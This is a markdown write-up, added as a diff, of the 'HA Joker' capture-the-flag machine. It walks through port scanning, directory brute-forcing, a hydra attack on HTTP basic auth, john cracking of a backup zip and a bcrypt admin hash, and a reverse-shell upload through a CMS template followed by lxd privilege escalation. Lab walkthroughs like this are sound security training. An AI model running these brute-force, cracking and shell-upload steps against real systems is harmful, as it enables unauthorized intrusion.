@@ -1,0 +1,148 @@
+#Title: HA Joker
+#Difficulty: Medium
+
+```bash
+nmap -sC -sV $THM
+
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
+|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA: Joker
+8080/tcp open  http    Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Please enter the password.
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+This means there are 2 websites and 1 ssh port open. Let's start with port 80. The website does not contain any information.
+
+```bash
+dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://$THM
+
+[18:35:04] Starting: 
+[18:35:06] 200 -    4KB - /img/
+[18:35:06] 301 -  308B  - /img  ->  http://$THM/img/
+[18:35:08] 403 -  276B  - /icons/
+[18:35:09] 200 -    6KB - /index.html
+[18:35:15] 301 -  308B  - /css  ->  http://$THM/css/
+[18:35:15] 200 -    1KB - /css/
+[18:36:15] 200 -  320B  - /secret.txt
+
+```
+
+All other folders return error except `secret.txt`.
+
+```
+Batman hits Joker.
+Joker: "Bats you may be a rock but you won't break me." (Laughs!)
+Batman: "I will break you with this rock. You made a mistake now."
+Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
+Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
+```
+
+It explicitly mentions `rock`. It may be a reference to rockyou.txt and breaking. We can continue with port 8080 by adding :8080 at the end of ip. It asks for authentication. We can brute-force with hydra. I will take a wild guess instead of using big wordlist of usernames I will first start with `joker`.
+
+`hydra -l joker -P /usr/share/wordlists/rockyou.txt -f $THM -s 8080 http-get -I /` . It worked and we got out password.
+
+`[8080][http-get] host: 10.10.94.94   login: joker   password: hannah`
+
+Let's now run our dirsearch with this new website. `dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://$THM:8080 --auth-type=basic --auth=joker:hannah`
+
+It contains a lot of directories. It also has robots.txt open and we can see directories from there too.
+
+```bash
+Disallow: /administrator/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+```
+
+```bash
+[18:42:45] Starting: 
+[18:42:48] 301 -  318B  - /images  ->  http://10.10.94.94:8080/images/
+[18:42:49] 301 -  317B  - /media  ->  http://10.10.94.94:8080/media/
+[18:42:49] 301 -  321B  - /templates  ->  http://10.10.94.94:8080/templates/
+[18:42:49] 200 -   31B  - /templates/
+[18:42:49] 200 -   31B  - /media/
+[18:42:49] 403 -  278B  - /icons/
+[18:42:49] 200 -   31B  - /images/
+[18:42:51] 301 -  319B  - /modules  ->  http://10.10.94.94:8080/modules/
+[18:42:51] 200 -   31B  - /modules/
+[18:42:51] 200 -   11KB - /index.php
+[18:42:56] 301 -  315B  - /bin  ->  http://10.10.94.94:8080/bin/
+[18:42:56] 200 -   31B  - /bin/
+[18:42:56] 301 -  319B  - /plugins  ->  http://10.10.94.94:8080/plugins/
+[18:42:56] 200 -   31B  - /plugins/
+[18:42:58] 301 -  320B  - /includes  ->  http://10.10.94.94:8080/includes/
+[18:42:58] 200 -   31B  - /includes/
+[18:43:01] 301 -  320B  - /language  ->  http://10.10.94.94:8080/language/
+[18:43:01] 200 -   31B  - /language/
+[18:43:01] 200 -    4KB - /README.txt
+[18:43:01] 200 -    4KB - /README
+[18:43:02] 200 -   31B  - /components/
+[18:43:02] 301 -  322B  - /components  ->  http://10.10.94.94:8080/components/
+[18:43:03] 301 -  317B  - /cache  ->  http://10.10.94.94:8080/cache/
+[18:43:03] 200 -   31B  - /cache/
+[18:43:05] 200 -   31B  - /libraries/
+[18:43:05] 301 -  321B  - /libraries  ->  http://10.10.94.94:8080/libraries/
+[18:43:12] 200 -  836B  - /robots.txt
+[18:43:12] 200 -  836B  - /robots
+[18:43:55] 200 -   12MB - /backup
+[18:43:58] 301 -  315B  - /tmp  ->  http://10.10.94.94:8080/tmp/
+[18:43:58] 200 -   31B  - /tmp/
+[18:44:00] 200 -   18KB - /LICENSE.txt
+[18:44:00] 200 -   18KB - /LICENSE
+[18:44:04] 301 -  319B  - /layouts  ->  http://10.10.94.94:8080/layouts/
+[18:44:04] 200 -   31B  - /layouts/
+[18:44:29] 301 -  325B  - /administrator  ->  http://10.10.94.94:8080/administrator/
+[18:44:29] 200 -    5KB - /administrator/
+```
+
+I checked /administrator and it contains a login page we can brute-force later but now most interesting thing is `/backup`. We may find some hidden information there. I used john to crack the zip file.
+
+```bash
+zip2john backup.zip > crack
+john --wordlist/usr/share/wordlists/rockyou.txt crack
+```
+
+It turns out joker uses same password for everywhere. It is `hannah`. Let's now unzip and start investigation. I checked the db folder and there was sql file I used sublime text to view and check for passwords. I found admin password and a hash there.
+`INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG'`
+
+We can use john and hashcat to cract it but I will continue with john.
+
+```bash
+echo "admin:$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG" > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcd1234         (admin)     
+1g 0:00:00:02 DONE (2023-11-22 19:02) 0.3690g/s 398.5p/s 398.5c/s 398.5C/s twilight..brownie
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+We got the password for admin page. We can now upload our reverse shell. To do that we can go to extentions and templates then sellect the first template and click on index.php or New File and upload the code then open the netcat `nc -nvlp 22`. Now you can go to main page or the page you uploaded and wait for connection. 
+
+BOOM! We got the shell now. We can now use linpeas and find out how we can priv esc. We see that there are a lot of vulnerabilities with this machine but the main one is about the group we are in which is `lxd`. I used this tutorial to do the escalation (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation). After that I got the root. The file is stored in `/mnt/root/root/final.txt`.
